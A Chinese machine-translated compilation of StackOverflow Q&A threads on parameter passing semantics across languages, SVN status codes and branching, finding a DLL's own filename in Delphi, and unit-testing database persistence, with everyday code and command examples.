# StackOverflow 问答 2000-2999

# language-agnostic - 通过引用传递还是通过值传递？

> ID：2027
> 
> 赞同：52
> 
> 时间：2008-08-05T08:56:01.023
> 
> 标签：language-agnostic, oop, parameters, pass-by-reference, pass-by-value

在学习一种新的编程语言时，您可能会遇到的一个可能的障碍是该语言是默认情况下是按*值传递还是按引用传递*。

所以这是我向你们所有人提出的问题，用你们最喜欢的语言，它实际上是*如何完成的？**可能的陷阱*是什么？

当然，您最喜欢的语言可以是您曾经玩过的任何语言：[流行的](http://www.ruby-lang.org/en/)、[晦涩的](http://www.devtopics.com/a-obscure-programming-language-of-the-month/)、[深奥](http://en.wikipedia.org/wiki/Brainfuck)的、[新](http://www.nvidia.com/object/cuda_get.html)的、[旧的](http://en.wikipedia.org/wiki/FORTRAN)……

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2008-08-05T08:56:35.530

这是我自己对[Java 编程语言](http://en.wikipedia.org/wiki/Java_(programming_language))的贡献。

首先是一些代码：

```
public void swap(int x, int y)
{
  int tmp = x;
  x = y;
  y = tmp;
} 
```

调用此方法将导致：

```
int pi = 3;
int everything = 42;

swap(pi, everything);

System.out.println("pi: " + pi);
System.out.println("everything: " + everything);

"Output:
pi: 3
everything: 42" 
```

即使使用“真实”对象也会显示类似的结果：

```
public class MyObj {
    private String msg;
    private int number;

    //getters and setters
    public String getMsg() {
        return this.msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }

    public int getNumber() {
        return this.number;
    }

    public void setNumber(int number) {
        this.number = number;
    }

    //constructor
    public MyObj(String msg, int number) {
        setMsg(msg);
        setNumber(number);
    }
}

public static void swap(MyObj x, MyObj y)
{
    MyObj tmp = x;
    x = y;
    y = tmp;
}

public static void main(String args[]) {
    MyObj x = new MyObj("Hello world", 1);
    MyObj y = new MyObj("Goodbye Cruel World", -1); 

    swap(x, y);

    System.out.println(x.getMsg() + " -- "+  x.getNumber());
    System.out.println(y.getMsg() + " -- "+  y.getNumber());
}

"Output:
Hello world -- 1
Goodbye Cruel World -- -1" 
```

因此很明显，Java 通过**value**传递其参数，因为*pi*和*所有内容*的值以及*MyObj 对象*没有交换。请注意，“按值”是java 中将参数传递给方法的*唯一方法。*（例如，像 c++ 这样的语言允许开发人员在参数类型后使用“ **&** ”通过引用传递参数）

现在是**棘手的部分**，或者至少是让大多数新的 Java 开发人员感到困惑的部分：（借用自[javaworld](http://www.javaworld.com/javaworld/javaqa/2000-05/03-qa-0526-pass.html)）
原作者：Tony Sintes

```
public void tricky(Point arg1, Point arg2)
{
    arg1.x = 100;
    arg1.y = 100;
    Point temp = arg1;
    arg1 = arg2;
    arg2 = temp;
}
public static void main(String [] args)
{
    Point pnt1 = new Point(0,0);
    Point pnt2 = new Point(0,0);
    System.out.println("X: " + pnt1.x + " Y: " +pnt1.y); 
    System.out.println("X: " + pnt2.x + " Y: " +pnt2.y);
    System.out.println(" ");
    tricky(pnt1,pnt2);
    System.out.println("X: " + pnt1.x + " Y:" + pnt1.y); 
    System.out.println("X: " + pnt2.x + " Y: " +pnt2.y);  
}

"Output
X: 0 Y: 0
X: 0 Y: 0
X: 100 Y: 100
X: 0 Y: 0" 
```

*tricky*成功改变了 pnt1 的值！这意味着对象是通过引用传递的，事实并非如此！**正确的**说法是：***对象引用*****是按值传递的。**

 *更多来自托尼·辛特斯：

> 该方法成功地改变了 pnt1 的值，即使它是按值传递的；但是，pnt1 和 pnt2 的交换失败了！这是混乱的主要来源。在 main() 方法中，pnt1 和 pnt2 只不过是对象引用。当您将 pnt1 和 pnt2 传递给 tricky() 方法时，Java 按值传递引用，就像任何其他参数一样。这意味着传递给该方法的引用实际上是原始引用的副本。下面的图 1 显示了在 Java 将对象传递给方法后指向同一个对象的两个引用。

[![图1](../Images/ab9815a13fc9846ef485cfc06487d4a8.png)](https://i.stack.imgur.com/EXPyo.gif)
[（来源：[javaworld.com](http://www.javaworld.com/javaworld/javaqa/2000-05/images/03-qa-0512-pass2b.gif)）]

**结论**或长话短说：

*   Java**按值传递参数**
*   *“按值”*是java中将参数传递给方法的**唯一方法**
*   使用作为参数给出*的对象中的方法***将改变**对象，因为引用指向原始对象。（如果该方法本身改变了某些值）

有用的链接：

*   [http://www.javaworld.com/javaworld/javaqa/2000-05/03-qa-0526-pass.html](http://www.javaworld.com/javaworld/javaqa/2000-05/03-qa-0526-pass.html)
*   [http://www.ibm.com/developerworks/java/library/j-passbyval/](http://www.ibm.com/developerworks/java/library/j-passbyval/)
*   [http://www.ibm.com/developerworks/library/j-praxis/pr1.html](http://www.ibm.com/developerworks/library/j-praxis/pr1.html)
*   [http://javadude.com/articles/passbyvalue.htm](http://javadude.com/articles/passbyvalue.htm)

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2008-08-23T16:50:59.403

**Python**使用按值传递，但由于所有这些值都是对象引用，因此最终效果类似于按引用传递。然而，Python 程序员更多地考虑对象类型是*可变*的还是*不可变*的。可变对象可以就地更改（例如，字典、列表、用户定义的对象），而不可变对象则不能（例如，整数、字符串、元组）。

下面的示例显示了一个函数，它传递了两个参数、一个不可变字符串和一个可变列表。

```
>>> def do_something(a, b):
...     a = "Red"
...     b.append("Blue")
... 
>>> a = "Yellow"
>>> b = ["Black", "Burgundy"]
>>> do_something(a, b)
>>> print a, b
Yellow ['Black', 'Burgundy', 'Blue'] 
```

该行仅仅为字符串值`a = "Red"`创建了一个本地名称 ,并且对传入的参数没有影响（它现在是隐藏的，因为从那时起必须引用本地名称）。无论参数是可变的还是不可变的，赋值都不是就地操作。`a``"Red"``a`

该`b`参数是对可变列表对象的引用，该`.append()`方法执行列表的就地扩展，附加新的`"Blue"`字符串值。

（因为字符串对象是不可变的，它们没有任何支持就地修改的方法。）

一旦函数返回，对的重新赋值`a`没有任何效果，而对的扩展`b`清楚地显示了传递引用风格的调用语义。

如前所述，即使参数 for`a`是可变类型，函数内的重新赋值也不是就地操作，因此传递参数的值不会发生变化：

```
>>> a = ["Purple", "Violet"]
>>> do_something(a, b)
>>> print a, b
['Purple', 'Violet'] ['Black', 'Burgundy', 'Blue', 'Blue'] 
```

如果您不希望被调用的函数修改列表，则可以改用不可变元组类型（由文字形式的括号而不是方括号标识），它不支持就地`.append()`方法：

```
>>> a = "Yellow"
>>> b = ("Black", "Burgundy")
>>> do_something(a, b)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 3, in do_something
AttributeError: 'tuple' object has no attribute 'append' 
```

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2008-08-05T16:40:35.063

这是[c# 编程语言的另一篇文章](http://msdn.microsoft.com/en-us/vcsharp/default.aspx)

c#**按值**传递其参数（默认情况下）

```
private void swap(string a, string b) {
  string tmp = a;
  a = b;
  b = tmp;
} 
```

因此，调用此版本的交换将没有结果：

```
string x = "foo";
string y = "bar";
swap(x, y);

"output: 
x: foo
y: bar" 
```

然而，[与 java](https://stackoverflow.com/questions/2027/#2028) c#不同，开发人员*有*机会**通过引用**传递参数，这是通过在参数类型之前使用 'ref' 关键字来完成的：

```
private void swap(ref string a, ref string b) {
  string tmp = a;
  a = b;
  b = tmp;
} 
```

此交换*将*更改引用参数的值：

```
string x = "foo";
string y = "bar";
swap(x, y);

"output: 
x: bar
y: foo" 
```

c# 也有一个**out 关键字**，ref 和 out 的区别是微妙的。 [来自 msdn：](http://msdn.microsoft.com/en-us/vcsharp/aa336814.aspx)

> **带有out 参数**的方法的调用者 不需要在调用之前分配作为 out 参数传递的变量；但是，被调用者*需要在返回之前分配给 out 参数。*

和

> 相反， **ref 参数**被 认为是由被调用者*最初分配的。*因此，被调用者*不需要* 在使用前分配给 ref 参数。Ref 参数传入和传出方法。

一个小陷阱是，就像在 java 中一样，**按值传递的对象仍然可以使用它们的内部方法进行更改**

**结论：**

*   c# 默认情况下**按值传递其参数**
*   但是当需要的参数也可以使用 ref 关键字**通过引用传递**
*   通过值传递的参数的内部方法**将改变**对象（如果该方法本身改变了某些值）

有用的链接：

*   [http://msdn.microsoft.com/en-us/vcsharp/aa336814.aspx](http://msdn.microsoft.com/en-us/vcsharp/aa336814.aspx)
*   [http://www.c-sharpcorner.com/UploadFile/saragana/Willswapwork11162005012542AM/Willswapwork.aspx](http://www.c-sharpcorner.com/UploadFile/saragana/Willswapwork11162005012542AM/Willswapwork.aspx)
*   [http://en.csharp-online.net/Value_vs_Reference](http://en.csharp-online.net/Value_vs_Reference)

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-04-13T15:33:07.853

由于我还没有看到 Perl 的答案，所以我想我会写一个。

在底层，Perl 有效地作为传递引用工作。作为函数调用参数的变量以引用方式传递，常量作为只读值传递，表达式的结果作为临时值传递。通过从 的列表赋值来构造参数列表的常用习语`@_`，或者`shift`倾向于对用户隐藏它，给出按值传递的外观：

```
sub incr {
  my ( $x ) = @_;
  $x++;
}

my $value = 1;
incr($value);
say "Value is now $value"; 
```

这将打印出来`Value is now 1`，因为`$x++`增加了`incr()`函数中声明的词法变量，而不是传入的变量。这种按值传递的风格通常是大多数时候想要的，因为修改其参数的函数在 Perl 中很少见，并且应该避免这种风格。

但是，如果出于某种原因特别需要这种行为，则可以通过直接对`@_`数组元素进行操作来实现，因为它们将是传递给函数的变量的别名。

```
sub incr {
  $_[0]++;
}

my $value = 1;
incr($value);
say "Value is now $value"; 
```

这次它会打印`Value is now 2`，因为`$_[0]++`表达式增加了实际`$value`变量。这样做的方式是，在底层`@_`不是像大多数其他数组那样真正的数组（例如将通过 获得`my @array`），而是它的元素直接由传递给函数调用的参数构建而成。如果需要，这允许您构建传递引用语义。作为普通变量的函数调用参数按原样插入到此数组中，常量或更复杂表达式的结果作为只读临时变量插入。

然而，在实践中这样做是非常罕见的，因为 Perl 支持引用值。也就是说，引用其他变量的值。通常，通过传入对该变量的引用来构造一个对变量有明显副作用的函数要清楚得多。这向调用站点的读者清楚地表明，传递引用语义是有效的。

```
sub incr_ref {
  my ( $ref ) = @_;
  $$ref++;
}

my $value = 1;
incr(\$value);
say "Value is now $value"; 
```

这里`\`操作符产生一个引用的方式与`&`C 中的地址操作符非常相似。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-08-06T22:43:29.900

.NET这里有一个[很好的解释。](http://codebetter.com/blogs/karlseguin/archive/2008/04/27/foundations-of-programming-pt-7-back-to-basics-memory.aspx)

很多人对引用对象实际上是按值传递（在 C# 和 Java 中）感到惊讶。它是堆栈地址的副本。这可以防止方法更改对象实际指向的位置，但仍允许方法更改对象的值。在 C# 中，可以通过引用传递引用，这意味着您可以更改实际对象指向的位置。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-08-05T10:00:46.930

别忘了还有**按名称**传递和**按值结果传递**。

按值传递结果与按值传递类似，增加的一点是在作为参数传递的原始变量中设置值。它可以在一定程度上避免对全局变量的干扰。在分区内存中显然更好，其中引用传递可能会导致页面错误（[Reference](http://logos.cs.uic.edu/476/notes/PassByRefOrValResult.html)）。

按名称传递意味着这些值仅在实际使用时计算，而不是在过程开始时计算。Algol 使用 pass-by-name，但一个有趣的副作用是编写交换过程非常困难（[参考](http://www.cs.sfu.ca/~cameron/Teaching/383/PassByName.html)）。此外，通过名称传递的表达式在每次访问时都会重新计算，这也会产生副作用。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2012-04-13T20:00:14.180

无论您所说的按值传递还是按引用传递，都必须在不同语言之间保持一致。跨语言使用的最常见和一致的定义是，通过引用传递，您可以“通常”将变量传递给函数（即不显式获取地址或类似的东西），并且函数可以*分配给*（不变异的内容）函数内部的参数，它将与分配给调用范围内的变量具有相同的效果。

从这个角度来看，语言分为以下几类；每个组具有相同的传递语义。如果您认为不应该将两种语言放在同一个组中，我挑战您想出一个区分它们的示例。

**包括C**、**Java**、**Python**、**Ruby**、**JavaScript**、**Scheme**、**OCaml**、**Standard ML**、**Go**、**Objective-C**、**Smalltalk**等在内的绝大多数语言都是**仅按值传递的**。传递指针值（某些语言称其为“引用”）不算作按引用传递；我们只关心传递的东西，指针，而不是指向的东西。

默认情况下，**C++**、**C#**、**PHP**等语言与上述语言一样是按值传递，但函数可以使用`&`或显式声明参数为按引用传递`ref`。

**Perl**总是通过引用传递；然而，在实践中，人们几乎总是在获取值后复制值，从而以传递值的方式使用它。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2009-11-21T17:14:18.330

关于[J](http://www.jsoftware.com)，虽然只有 AFAIK 按值传递，但有一种通过引用传递的形式，可以移动大量数据。您只需将称为语言环境的东西传递给动词（或函数）。它可以是一个类的实例或只是一个通用容器。

```
spaceused=: [: 7!:5 <
exectime =: 6!:2
big_chunk_of_data =. i. 1000 1000 100
passbyvalue =: 3 : 0
    $ y
    ''
)
locale =. cocreate''
big_chunk_of_data__locale =. big_chunk_of_data
passbyreference =: 3 : 0
    l =. y
    $ big_chunk_of_data__l
    ''
)
exectime 'passbyvalue big_chunk_of_data'
   0.00205586720663967
exectime 'passbyreference locale'
   8.57957102144893e_6 
```

明显的缺点是您需要在被调用函数中以某种方式知道变量的名称。但是这种技术可以轻松地移动大量数据。这就是为什么，虽然技术上不是通过引用传递，但我称之为“差不多”。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-08-05T09:10:58.933

**按价值**

*   比引用慢，因为系统必须复制参数
*   仅用于输入

**引用**

*   更快，因为只传递了一个指针
*   用于输入**和**输出
*   如果与全局变量一起使用会非常危险

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-08-11T02:21:42.963

PHP 也是按值传递的。

```
<?php
class Holder {
    private $value;

    public function __construct($value) {
        $this->value = $value;
    }

    public function getValue() {
        return $this->value;
    }
}

function swap($x, $y) {
    $tmp = $x;
    $x = $y;
    $y = $tmp;
}

$a = new Holder('a');
$b = new Holder('b');
swap($a, $b);

echo $a->getValue() . ", " . $b->getValue() . "\n"; 
```

输出：

```
a b 
```

然而，在 PHP4 中，对象被视为[原语](http://www.php.net/manual/en/migration5.oop.php)。意思是：

```
<?php
$myData = new Holder('this should be replaced');

function replaceWithGreeting($holder) {
    $myData->setValue('hello');
}

replaceWithGreeting($myData);
echo $myData->getValue(); // Prints out "this should be replaced" 
```

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2011-01-13T20:48:40.970

默认情况下，ANSI/ISO C 使用任何一种——这取决于你如何声明你的函数及其参数。

如果将函数参数声明为指针，则函数将通过引用传递，如果将函数参数声明为非指针变量，则函数将按值传递。

```
void swap(int *x, int *y);   //< Declared as pass-by-reference.
void swap(int x, int y);     //< Declared as pass-by-value (and probably doesn't do anything useful.) 
```

如果您创建的函数返回指向在该函数中创建的非静态变量的指针，您可能会遇到问题。以下代码的返回值将是未定义的——无法知道分配给函数中创建的临时变量的内存空间是否被覆盖。

```
float *FtoC(float temp)
{
    float c;
    c = (temp-32)*9/5;
    return &c;
} 
```

但是，您可以返回对静态变量的引用或在参数列表中传递的指针。

```
float *FtoC(float *temp)
{
    *temp = (*temp-32)*9/5;
    return temp;
} 
```*

# svn - SVN 中的结果代码是什么意思？

> ID：2034
> 
> 赞同：313
> 
> 时间：2008-08-05T09:11:54.877
> 
> 标签：svn

SVN 中的结果代码是什么意思？我需要一个快速参考。

* * *

## 回答 #1

> 赞同：534
> 
> 时间：2008-08-05T09:12:29.947

有关其他详细信息，请参阅 SVNBook：[“工作副本文件和目录的状态”](http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.status.html)。

常见状态：

> **U** : 工作文件已更新
> 
> **G** : 对 repo 的更改自动合并到工作副本中
> 
> **M** : 工作副本被修改
> 
> **C** : 此文件与 repo 中的版本冲突
> 
> **?** : 此文件不受版本控制
> 
> **！**：此文件受版本控制，但丢失或不完整
> 
> **A** : 此文件将被添加到版本控制中（提交后）
> 
> **A+**：此文件将被移动（提交后）
> 
> **D**：这个文件将被删除（提交后）
> 
> **S**：这表示文件或目录已从工作副本的其余部分（使用 svn 切换）的路径切换到分支
> 
> **我**：忽略
> 
> **X**：外部定义
> 
> **~** : 类型改变
> 
> **R**：您的工作副本中的项目已被替换。这意味着该文件被安排删除，然后一个同名的新文件被安排添加到它的位置。
> 
> **L** : 项目被锁定
> 
> **E**：项目存在，因为它本来是由 svn 更新创建的。

* * *

## 回答 #2

> 赞同：90
> 
> 时间：2008-08-16T23:49:25.000

另请注意，第二列中的结果代码是指文件的属性。例如：

```
U   filename.1
 U  filename.2  
UU  filename.3 
```

filename.1：文件已更新
filename.2：文件的一个或多个属性（例如 svn:keywords）已更新
filename.3：文件及其属性均已更新

* * *

## 回答 #3

> 赞同：38
> 
> 时间：2011-05-17T08:50:32.163

你总是可以通过运行得到一个列表：

```
svn status --help 
```

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2012-05-10T02:31:04.053

我想说一些关于“G”状态的事情，

**G：对 repo 的更改自动合并到工作副本中**

我觉得上面的定义不太清楚，可能会产生一点混乱，因为所有文件都会自动合并到工作副本中，正确的应该是：

**U = 项目 (U) 已更新到存储库版本**

**G = 项目的本地更改与存储库合并（G）**

**C = 项目的本地更改 (C) 与存储库冲突**

**D = 从工作副本中删除的项目 (D)**

**A = 项目 (A) 添加到工作副本**

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2012-05-23T00:46:15.720

还有一个“E”状态

**E = 文件在更新前存在**

如果您手动创建了通过执行更新创建的文件夹，则可能会发生这种情况。

* * *

## 回答 #6

> 赞同：16
> 
> 时间：2016-11-07T16:35:36.567

# SVN 状态栏

```
$ svn status
L index.html 
```

该命令的输出分为六列，但这并不明显，因为有时这些列是空的。也许用破折号表示空列会更有意义，就像`ls -l`这样，而不是什么都没有。然后，例如，`L index.html`看起来像`--L--- index.html`，这很明显我们唯一的信息是在第三列中关于锁定的信息。无论如何，一旦你知道它开始变得更有意义。

## SVN状态第一列：A、D、M、R、C、X、I、?、!、~

第一列表示添加、删除或以其他方式更改的项目。

   没有修改。

` A `   项目计划添加。

` D `   项目计划删除。

` M `   项目已修改。

` R `   您的工作副本中的项目已被替换。这意味着该文件被安排删除，然后一个同名的新文件被安排添加到它的位置。

` C `   项目的内容（相对于属性）与从存储库接收的更新冲突。

` X `   项目与外部定义相关。

` I `   项目被忽略（例如使用 svn:ignore 属性）。

` ? `   项目不受版本控制。

` ! `   项目丢失（例如，您在不使用 svn 的情况下移动或删除了它）。这也表明目录不完整（签出或更新被中断）。

` ~ `   项目被版本化为一种对象（文件、目录、链接），但已被不同类型的对象替换。

## SVN状态第二列：M，C

第二列告诉文件或目录属性的状态。

   没有修改。

` M `   此项目的属性已被修改。

` C `   此项目的属性与从存储库接收的属性更新冲突。

## SVN状态第三列：L

仅当工作副本目录被锁定时才填充第三列（svn cleanup 通常应该足以清除它）

   项目未锁定。

` L `   项目已锁定。

## SVN状态第四栏：+

仅当项目计划添加历史记录时才会填充第四列。

   没有安排提交的历史记录。

` + `   与提交一起安排的历史记录。

## SVN状态第五栏：S

仅当项目的工作副本相对于其父项切换时，才会填充第五列

   Item 是其父目录的子目录。

` S `   项目已切换。

## SVN状态第六列：K、O、T、B

第六列填充了锁定信息。

   使用 –show-updates 时，文件未锁定。如果不使用-show-updates，这仅仅意味着文件没有被锁定在这个工作副本中。

` K `   文件被锁定在这个工作副本中。

` O `   文件被另一个用户或另一个工作副本锁定。这仅在使用 –show-updates 时出现。

` T `   文件被锁定在此工作副本中，但锁定已被盗并且无效。该文件当前已锁定在存储库中。这仅在使用 –show-updates 时出现。-

` B `   文件已锁定在此工作副本中，但锁定已被破坏且无效。文件不再锁定 这仅在使用 –show-updates 时出现。

## SVN状态第七栏：*

过时的信息出现在第七列（仅当您通过 –show-updates 开关时）。这是 SVN 新手期望该命令执行的操作，但没有意识到它仅将文件的当前状态与上次更新时从服务器获取的信息进行比较。

   您的工作副本中的项目是最新的。

` * `   服务器上存在该项目的较新版本。

* * *

## 回答 #7

> 赞同：13
> 
> 时间：2008-08-08T09:20:37.587

我通常通过 gui 使用 svn，无论是我的 IDE 还是客户端。因此，当我不得不求助于命令行时，我永远记不起这些代码。

我发现这个备忘单很有帮助： [Subversion Cheat Sheet](http://www.addedbytes.com/cheat-sheets/subversion-cheat-sheet/)

* * *

## 回答 #8

> 赞同：12
> 
> 时间：2008-08-15T22:01:40.897

查看 Subversion Book 参考：[“工作副本文件和目录的状态”](http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.status.html)

强烈推荐给任何使用 SVN 做任何事情的人。

* * *

## 回答 #9

> 赞同：8
> 
> 时间：2016-01-13T11:16:45.160

每当您无权访问文档 ( [SVNBook](http://svnbook.red-bean.com/en/1.8/) ) 时，请键入 (Linux)：

```
svn help status | grep \'\?\'
svn help status | grep \'\!\'
svn help status | grep \'\YOUR_SYMBOL_HERE\' 
```

或在 ~/.bashrc 文件中插入以下函数，如下所示：

```
svncode() {
  symbol=$1
  [ $symbol ] &&  svn help status | grep \'$(echo $symbol)\' || \
  echo "usage: svncode <symbol>"
} 
```

[![在此处输入图像描述](../Images/e5600a21705a87ac8ecf8a51a0c351c1.png)](https://i.stack.imgur.com/YEiq5.png)

# svn - 如何创建分支？

> ID：2041
> 
> 赞同：651
> 
> 时间：2008-08-05T09:25:29.000
> 
> 标签：svn, version-control, branch, branching-and-merging

如何在 SVN 中创建分支？

* * *

## 回答 #1

> 赞同：627
> 
> 时间：2008-08-05T09:25:40.510

`svn copy`使用如下命令创建一个新分支：

```
$ svn copy svn+ssh://host.example.com/repos/project/trunk \
           svn+ssh://host.example.com/repos/project/branches/NAME_OF_BRANCH \
      -m "Creating a branch of project" 
```

* * *

## 回答 #2

> 赞同：370
> 
> 时间：2008-08-05T13:40:20.777

Subversion 中的分支是由一个非常轻量级和高效的复制工具来促进的。

分支和标记实际上是相同的。`svn copy`只需使用命令将存储库中的整个文件夹复制到存储库中的其他位置。

基本上，这意味着按照惯例，复制文件夹意味着什么——无论是备份、标签、分支还是其他。根据您对事物的思考方式（通常取决于您过去使用的 SCM 工具），您需要在存储库中设置文件夹结构以支持您的风格。

常见的样式是在存储库顶部有一堆文件夹，称为`tags`, `branches`,`trunk`等 - 允许您将整个`trunk`（或子集）复制到`tags`和/或`branches`文件夹中。如果您有多个项目，您可能希望在每个项目下复制这种结构：

习惯这个概念可能需要一段时间 - 但它确实有效 - 只需确保您（和您的团队）清楚您将使用的约定。拥有一个好的命名约定也是一个好主意——它告诉你为什么创建分支/标签以及它是否仍然合适——考虑归档过时的分支的方法。

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2016-02-10T20:36:21.917

如果你的 repo 可以通过 https 获得，你可以使用这个命令来分支 ...

```
svn copy https://host.example.com/repos/project/trunk \
       https://host.example.com/repos/project/branches/branch-name \
  -m "Creating a branch of project" 
```

* * *

## 回答 #4

> 赞同：27
> 
> 时间：2013-09-03T09:14:12.763

```
svn cp /trunk/ /branch/NEW_Branch 
```

如果您在主干中有一些本地更改，请使用`Rsync`同步更改

```
rsync -r -v -p --exclude ".svn" /trunk/ /branch/NEW_Branch 
```

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2013-07-23T09:51:33.360

假设您想从主干名称（如“TEST”）创建一个分支，然后使用：

```
svn cp -m "CREATE BRANCH TEST" $svn_url/trunk $svn_url/branches/TEST 
```

* * *

## 回答 #6

> 赞同：16
> 
> 时间：2014-03-28T11:30:44.550

给新 SVN 用户的重要提示；这可能有助于快速获取正确的 URL。

运行`svn info`以显示有关当前签出分支的有用信息。

URL 应该（如果您在根文件夹中运行 svn）为您提供需要从中复制的 URL。

同样要切换到新创建的分支，请使用以下`svn switch`命令：

```
svn switch http://my.repo.url/myrepo/branches/newBranchName 
```

* * *

## 回答 #7

> 赞同：15
> 
> 时间：2008-08-05T12:40:31.337

通常，您会将其复制到 svn+ssh://host.example.com/repos/project/branches/mybranch 以便您可以在存储库中保留多个分支，但您的语法是有效的。

[以下是有关如何设置存储库布局](http://svnbook.red-bean.com/en/1.1/ch04s07.html)的一些建议。

* * *

## 回答 #8

> 赞同：12
> 
> 时间：2008-08-05T12:46:40.637

如果你甚至打算合并你的分支，我强烈建议你看看这个：

[svnmerge.py](http://www.orcaware.com/svn/wiki/Svnmerge.py)

我听说 Subversion 1.5 构建了更多的合并跟踪，我没有这方面的经验。我的项目在 1.4.x 上，svnmerge.py 是救生员！

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2014-02-05T10:24:54.917

*   在当前项目之外创建一个新文件夹。你可以给它任何名字。（例如：您有一个名为“Customization”的项目的结帐。它有许多项目，例如“Project1”、“Project2”......并且您想创建“Project1”的一个分支。所以首先打开“自定义”，右键单击并创建一个新文件夹并为其命名，“Project1Branch”）。
*   右键单击“Myproject1”.... TortoiseSVN -> 分支/标签。
*   选择工作副本。
*   打开浏览器....就在“To URL”上的平行右侧。
*   选择自定义.....右键单击然后添加文件夹。并浏览您创建的文件夹。这里是“Project1Branch”。现在单击确定按钮添加。
*   结帐这个新银行。
*   再次转到您要创建的项目的分支。右键单击 TorotoiseSVN -> 分支/标签。然后选择工作副本。您可以将 URL 作为您的分支名称。比如{你的 IP 地址/svn/AAAA/Customization/Project1Branch}。您可以在 URL 中设置名称，以便它只创建具有此名称的文件夹。像{您的 IP 地址/svn/AAAA/Customization/Project1Branch/MyProject1Branch}。
*   按确定按钮。现在您可以看到日志...您的工作副本将存储在您的分支中。
*   现在您可以结账了……让您享受您的工作。:)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2020-03-27T05:45:45.533

以下是在 Windows 机器中使用 TortoiseSVN 从主干创建分支的步骤。这显然需要安装 TortoiseSVN 客户端。

1.  右键单击本地 Windows 机器上的更新后备箱
2.  选择 TortoiseSVN
3.  单击分支/标签
4.  选择 SVN 存储库中的 To 路径。请注意，目标 URL 会根据给定的路径和分支名称进行更新
5.  不要在存储库浏览器的分支内创建文件夹
6.  添加分支路径。例如，分支/
7.  添加有意义的日志消息供您参考
8.  单击确定，这将在本地系统上创建新文件夹
9.  签出创建到新文件夹中的分支

# windows - Windows dll 可以检索自己的文件名吗？

> ID：2043
> 
> 赞同：33
> 
> 时间：2008-08-05T09:34:49.073
> 
> 标签：windows, delphi, winapi, dll

从 exe 文件创建的 Windows 进程可以访问调用它的命令字符串，包括其文件的路径和文件名。例如。`C:\MyApp\MyApp.exe --help`.

但对于通过`LoadLibrary`. 有谁知道通过 dll 加载函数的方法来找出它的路径和文件名是什么？

具体来说，我对 Delphi 解决方案感兴趣，但我怀疑任何语言的答案都几乎相同。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2008-08-05T09:37:13.577

我认为您正在寻找 GetModuleFileName。

[http://www.swissdelphicenter.ch/torry/showcode.php?id=143](http://www.swissdelphicenter.ch/torry/showcode.php?id=143)：

```
{
  If you are working on a DLL and are interested in the filename of the
  DLL rather than the filename of the application, then you can use this function:
}

function GetModuleName: string;
var
  szFileName: array[0..MAX_PATH] of Char;
begin
  FillChar(szFileName, SizeOf(szFileName), #0);
  GetModuleFileName(hInstance, szFileName, MAX_PATH);
  Result := szFileName;
end; 
```

虽然未经测试，但自从我与 Delphi 合作以来已经有一段时间了 :)

# sql-server - 如何对持久性进行单元测试？

> ID：2046
> 
> 赞同：50
> 
> 时间：2008-08-05T09:43:01.257
> 
> 标签：sql-server, unit-testing, tdd

作为一名实践测试驱动开发的新手，我经常陷入困境，即如何对数据库的持久性进行单元测试。

我知道从技术上讲这将是一个集成测试（不是单元测试），但我想找出以下最佳策略：

1.  测试查询。
2.  测试插入。如果插入失败，我怎么知道插入出错了？我可以通过插入然后查询来测试它，但是我怎么知道查询没有错呢？
3.  测试更新和删除——与测试插入相同

做这些的最佳实践是什么？

* * *

关于测试 SQL：我知道这可以完成，但是如果我使用像 NHibernate 这样的 O/R 映射器，它会在用于输出查询的别名中附加一些命名疣，因为这有点不可预测，我不确定我可以对此进行测试。

我应该放弃一切并简单地信任NHibernate吗？我不确定这是否谨慎。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-08-11T09:40:44.607

查看数据库单元。它是一个 Java 库，但必须有一个 C# 等价物。它使您可以使用一组数据准备数据库，以便您了解数据库中的内容，然后您可以与 DB Unit 交互以查看数据库中的内容。它可以针对许多数据库系统运行，因此您可以使用实际的数据库设置，或使用其他东西，例如 Java 中的 HSQL（具有内存选项的 Java 数据库实现）。

如果您想测试您的代码是否正确使用数据库（您很可能应该这样做），那么这是隔离每个测试并确保数据库已准备好预期数据的方法。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2008-08-25T13:22:46.733

As [Mike Stone said](https://stackoverflow.com/questions/2046/how-do-i-unit-test-persistence#7641), DbUnit is great for getting the database into a known state before running your tests. When your tests are finished, DbUnit can put the database back into the state it was in before you ran the tests.

[DbUnit (Java)](http://www.dbunit.org/)

[DbUnit.NET](http://dbunit-net.sourceforge.net/)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-05T09:47:41.013

您通过模拟数据库连接来进行单元测试。这样，您可以构建方法调用流中的特定查询成功或失败的场景。我通常构建我的模拟期望，以便忽略实际的查询文本，因为我真的想测试方法的容错性以及它如何处理自身——SQL 的细节与此无关。

显然这意味着您的测试实际上不会验证该方法是否*有效*，因为 SQL 可能是错误的。这就是集成测试开始的地方。为此，我希望其他人会有更彻底的答案，因为我自己才刚刚开始掌握这些。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-08-12T23:23:30.933

我在这里写了一篇关于[单元测试](http://buffered.io/posts/unit-tests-boldly-crossing-boundaries-and-gently-breaking-rules/)涵盖这个确切问题的数据层的帖子。为（可耻的）插件道歉，但文章太长，无法在此处发布。

I hope that helps you - it has worked very well for me over the last 6 months on 3 active projects.

Regards,

Rob G

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-05T10:29:42.880

